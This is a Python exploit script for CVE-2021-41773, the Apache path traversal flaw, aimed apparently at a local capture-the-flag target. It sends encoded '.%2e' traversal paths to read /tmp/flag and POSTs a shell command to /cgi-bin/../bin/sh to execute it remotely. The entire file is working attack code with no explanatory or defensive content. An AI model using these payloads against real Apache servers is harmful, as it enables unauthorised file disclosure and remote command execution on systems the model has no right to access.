#!/usr/bin/env python3
import socket

def send_http_request(host, port, path, method="GET", body=""):
    """Send HTTP request and return response"""
    try:
        # Create fresh socket for each request
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        
        # Connect
        s.connect((host, port))
        
        # Build request
        if method == "POST":
            request = f"{method} {path} HTTP/1.0\r\n"
            request += f"Host: {host}\r\n"
            request += f"Content-Length: {len(body)}\r\n"
            request += "\r\n"
            request += body
        else:
            request = f"{method} {path} HTTP/1.0\r\n"
            request += f"Host: {host}\r\n"
            request += "\r\n"
        
        # Send
        s.sendall(request.encode())
        
        # Receive
        response = b""
        while True:
            try:
                data = s.recv(1024)
                if not data:
                    break
                response += data
            except:
                break
        
        s.close()
        return response.decode('utf-8', errors='ignore')
    
    except Exception as e:
        return f"ERROR: {str(e)}"

# Target
host = "127.0.0.1"
port = 32808

print("=" * 60)
print("CVE-2021-41773 Apache Path Traversal Exploit")
print("=" * 60)

# Test 1: Direct file read via GET
print("\n[TEST 1] GET request to read /tmp/flag directly")
path1 = "/.%2e/.%2e/.%2e/.%2e/tmp/flag"
print(f"Path: {path1}")
resp1 = send_http_request(host, port, path1, "GET")
print(f"Response:\n{resp1}\n")

# Test 2: Command execution via POST to /bin/sh
print("\n[TEST 2] POST request to execute command via /bin/sh")
path2 = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
command = "cat /tmp/flag"
print(f"Path: {path2}")
print(f"Command: {command}")
resp2 = send_http_request(host, port, path2, "POST", command)
print(f"Response:\n{resp2}\n")

# Test 3: Alternative path
print("\n[TEST 3] Alternative path pattern")
path3 = "/icons/.%2e/.%2e/.%2e/.%2e/tmp/flag"
print(f"Path: {path3}")
resp3 = send_http_request(host, port, path3, "GET")
print(f"Response:\n{resp3}\n")

print("=" * 60)
print("Exploit attempts completed")
print("=" * 60)

